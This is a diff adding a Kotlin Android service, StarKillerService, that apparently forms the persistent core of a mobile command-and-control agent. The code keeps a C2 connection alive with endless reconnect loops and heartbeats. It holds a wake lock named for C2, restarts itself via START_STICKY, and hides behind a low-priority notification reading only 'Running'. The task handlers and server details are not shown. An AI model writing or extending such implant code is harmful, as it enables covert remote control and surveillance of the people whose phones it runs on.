@@ -1,0 +1,125 @@
+package com.starkiller.agent
+
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
+import android.os.BatteryManager
+import android.os.Build
+import android.os.IBinder
+import android.os.PowerManager
+import androidx.core.app.NotificationCompat
+import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
+import kotlin.math.min
+
+class StarKillerService : Service() {
+
+    private val executor = Executors.newScheduledThreadPool(3)
+    private lateinit var taskRouter: TaskRouter
+    private lateinit var client: C2Client
+    private var wakeLock: PowerManager.WakeLock? = null
+    private var reconnectDelay = Config.RECONNECT_BASE_MS
+
+    @Volatile
+    private var running = false
+
+    override fun onCreate() {
+        super.onCreate()
+        taskRouter = TaskRouter(this)
+        client = C2Client(this, taskRouter)
+        taskRouter.client = client
+        acquireWakeLock()
+        startForegroundNotification()
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (!running) {
+            running = true
+            executor.submit { connectionLoop() }
+        }
+        return START_STICKY
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
+    override fun onDestroy() {
+        running = false
+        client.disconnect()
+        executor.shutdownNow()
+        wakeLock?.let { if (it.isHeld) it.release() }
+        super.onDestroy()
+    }
+
+    private fun connectionLoop() {
+        while (running) {
+            try {
+                client.connect()
+                reconnectDelay = Config.RECONNECT_BASE_MS
+                startHeartbeat()
+                client.receiveLoop()
+            } catch (_: Exception) {}
+
+            client.disconnect()
+            if (!running) break
+
+            try {
+                Thread.sleep(reconnectDelay)
+            } catch (_: InterruptedException) { break }
+
+            reconnectDelay = min(reconnectDelay * 2, Config.RECONNECT_MAX_MS)
+        }
+    }
+
+    private fun startHeartbeat() {
+        executor.scheduleAtFixedRate({
+            if (client.connected) {
+                try {
+                    client.sendHeartbeat(getBatteryLevel(), null)
+                } catch (_: Exception) {}
+            }
+        }, Config.HEARTBEAT_INTERVAL_MS, Config.HEARTBEAT_INTERVAL_MS, TimeUnit.MILLISECONDS)
+    }
+
+    fun getBatteryLevel(): Int {
+        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+        val battery = registerReceiver(null, filter)
+        val level = battery?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = battery?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
+        return if (scale > 0) (level * 100) / scale else -1
+    }
+
+    private fun acquireWakeLock() {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "starkiller:c2wakelock"
+        ).apply { acquire() }
+    }
+
+    private fun startForegroundNotification() {
+        val channelId = "sk_service"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                channelId,
+                getString(R.string.notification_channel),
+                NotificationManager.IMPORTANCE_LOW
+            ).apply { setShowBadge(false) }
+            val nm = getSystemService(NotificationManager::class.java)
+            nm.createNotificationChannel(channel)
+        }
+
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle(Config.APP_NAME)
+            .setContentText("Running")
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .build()
+
+        startForeground(1, notification)
+    }
+}
